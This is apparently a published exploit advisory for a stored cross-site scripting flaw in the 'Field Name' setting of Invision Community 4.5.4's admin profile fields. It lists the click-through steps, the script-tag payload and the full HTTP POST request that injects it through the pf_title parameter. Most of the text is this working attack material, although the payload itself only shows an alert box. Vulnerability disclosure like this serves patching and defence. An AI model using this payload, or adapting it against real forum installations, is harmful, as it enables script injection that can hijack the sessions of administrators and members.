# Invision Community 4.5.4 - 'Field Name' Stored Cross-Site Scripting
## Exploit Author: Hemant Patidar (HemantSolo)
## Vendor Homepage: https://invisioncommunity.com/
## Software Link: https://invisioncommunity.com/buy
## Version: 4.5.4
## Tested on: Windows 10 PHP 5.4.5 Apache 2.4.23


 
1. Go to the Invision Community admin page.
2. Now go to the Members - MEMBER SETTINGS - Profiles.
3. Now click on Add Profile field.
4. Put the below payload in Field Name:
"<script>alert(123)</script>"
5. Now click on Save button.
6. The XSS will be triggered.
 
 Vulnerable Parameters: Field Name.
 
 ```
POST /admin/?app=core&module=membersettings&controller=profiles&tab=profilefields&subnode=1&do=form&parent=3&ajaxValidate=1 HTTP/1.1
Host: 127.0.0.1

 
form_new_activeTab=&form_new_submitted=1&csrfKey=3ffc7a5774ddc0d2a7142d2072191efc&MAX_FILE_SIZE=20971520&pf_title%5B1%5D=%3Cscript%3Ealert(123)%3C%2Fscript%3E&pf_desc%5B1%5D=Test&pf_group_id=3&pf_type=Text&pf_allow_attachments=0&pf_allow_attachments_checkbox=1&pf_content%5B0%5D=&pf_multiple=0&pf_max_input=0&pf_input_format=&pf_member_edit=0&pf_member_edit_checkbox=1&radio_pf_member_hide__empty=1&pf_member_hide=all&radio_pf_topic_hide__empty=1&pf_topic_hide=hide&pf_search_type=loose&pf_search_type_on_off=exact&radio_pf_profile_format__empty=1&pf_profile_format=default&pf_profile_format_custom=&radio_pf_format__empty=1&pf_format=default&pf_format_custom=
 
 ```
